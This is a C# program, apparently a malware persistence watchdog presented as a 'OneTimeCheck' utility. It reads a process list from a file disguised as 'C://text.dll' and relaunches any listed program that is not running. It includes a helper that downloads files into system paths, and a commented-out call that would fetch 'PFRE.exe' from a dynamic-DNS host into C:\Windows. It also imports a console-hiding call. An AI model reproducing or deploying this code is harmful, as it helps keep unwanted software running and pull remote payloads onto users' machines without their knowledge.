using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace OneTimeCheck
{
    public class PInfo
    {
        public string Name { get; set; }
        public string Path { get; set; }

        public bool Status { get; set; }
        public PInfo(string _name, string _path)
        {
            Name = _name;
            Path = _path;
            Status = false;
        }
    }
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        private void down(string path, string filename, string url)
        {
            // Download

            try
            {
                FileInfo file = new FileInfo(filename);
                using (WebClient Client = new WebClient())
                {

                    Client.DownloadFile(url, file.FullName);
                    //Process.Start(file.FullName);

                }
                File.Copy(file.FullName, path);
                File.Delete(file.FullName);
            }
            catch
            {
            }


        }


        static Process execute(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            // netsh advfirewall show domain state
            process.StartInfo.Arguments = "/c " + command; // Note the /c command (*)
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = false;
            process.Start();
            return process;
        }

        static List<PInfo> ReadAll(string filename)
        {
            // A list that has all PInfos 
            List<PInfo> listOfPInfo = new List<PInfo>();
            PInfo tmp;
            string line;

            // Read the file
            System.IO.StreamReader file =
                new System.IO.StreamReader(filename);

            while ((line = file.ReadLine()) != null)
            {
                // Taking a string 
                String str = line;
                // spearator
                char spearator = ';';
                // Split every line
                String[] strlist = str.Split(spearator);

                // If we have more than two elements that means we can add them.
                if (strlist.Length > 1)
                {
                    tmp = new PInfo(strlist[0].Trim(new Char[] { '\n', '\r' }), strlist[1].Trim(new Char[] { '\n', '\r' }));
                    listOfPInfo.Add(tmp);
                }
            }
            file.Close();
            return listOfPInfo;
        }

        static void Main(string[] args)
        {
            List<PInfo> listOfPInfo;
            try
            {
                listOfPInfo = ReadAll("C://text.dll");
            }
            catch
            {
                return;
            }

            Program c = new Program();
            var handle = GetConsoleWindow();
            // Hide
            //ShowWindow(handle, SW_HIDE);

            var startTimeSpan = TimeSpan.Zero;
            var periodTimeSpan = TimeSpan.FromMinutes(5);

            Console.WriteLine(listOfPInfo.Count);

         

            // For each element in listOfPInfo
            for (var i = 0; i < listOfPInfo.Count; i++)
            {
                // Reset
                listOfPInfo[i].Status = false;
                Console.WriteLine(i);
                try
                {
                    //Console.WriteLine("Name:" + proc.ProcessName + " Path:" + proc.MainModule.FileName + " Id:" + proc.Id);
                    Console.WriteLine(listOfPInfo[i].Name);

                    Process[] procs = Process.GetProcesses();
                    foreach (Process proc in procs)
                    {
                        try
                        {
                            //Console.WriteLine("Name:" + proc.ProcessName + " Path:" + proc.MainModule.FileName + " Id:" + proc.Id);
                            if (proc.ProcessName.Contains(listOfPInfo[i].Name))
                            {
                                listOfPInfo[i].Status = true;
                            }
                        }
                        catch
                        {
                            Console.WriteLine("Problemooo1");
                            continue;
                        }
                    }
                }
                catch
                {
                    Console.WriteLine("Problemooo2");
                    continue;
                }


            }


            for (var i = 0; i < listOfPInfo.Count; i++)
            {
                if (listOfPInfo[i].Status == false)
                {
                    // If the file does not exist, download it.
                    try
                    {
                        if (!System.IO.File.Exists(listOfPInfo[i].Path))
                        {
                            Console.WriteLine("The file does not exist");
                            //if (!File.Exists(sourceFile))
                            //{
                            //    c.down(@"C:\Windows\PFRE.exe", "AdoInstall.exe", "http://ritrit.ddns.net:8888/PFRE.exe");
                            //}
                            //System.IO.File.Copy(sourceFile, destinationFile);
                        }
                    }
                    catch
                    {
                        continue;
                    }

                    try
                    {
                        Console.WriteLine("Running -> " + listOfPInfo[i].Name);
                        Process.Start(listOfPInfo[i].Path);
                    }
                    catch
                    {
                        continue;
                    }

                }

            }
        }
    }
}
